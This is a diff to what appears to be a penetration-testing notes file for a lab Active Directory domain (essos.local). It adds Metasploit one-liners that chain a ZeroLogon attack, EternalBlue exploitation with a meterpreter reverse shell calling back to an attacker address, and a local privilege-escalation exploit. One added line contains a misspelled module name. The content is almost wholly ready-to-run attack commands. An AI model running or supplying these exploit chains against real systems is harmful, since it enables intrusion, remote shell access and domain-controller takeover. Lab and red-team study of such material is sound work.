@@ -73,6 +73,9 @@ smbclient.py -k @braavos.essos.local
 
 ----
 msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.2.10.11 10.2.10.21; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.2.10.11 10.2.10.21; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.2.99.1; run; sessions -i -1 -C 'use exploit/windows/local/cve_2023_21768_afd_lpe; run'; exit"
+msfconsole -q -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologo; set RHOSTS 10.2.10.11; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.2.10.11 10.2.10.21; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.2.99.1; run; sessions -i -1 -C 'use exploit/windows/local/cve_2023_21768_afd_lpe; run'; exit"
+
+msfconsole -q -x "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon; set RHOSTS 10.2.10.11,10.2.10.21; run; exit"
 
 msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 10.2.10.0/24; run; use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.2.10.0/24; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.2.99.1; run; sessions -i -1 -C 'use exploit/windows/local/cve_2023_21768_afd_lpe; run'; exit" 
 --
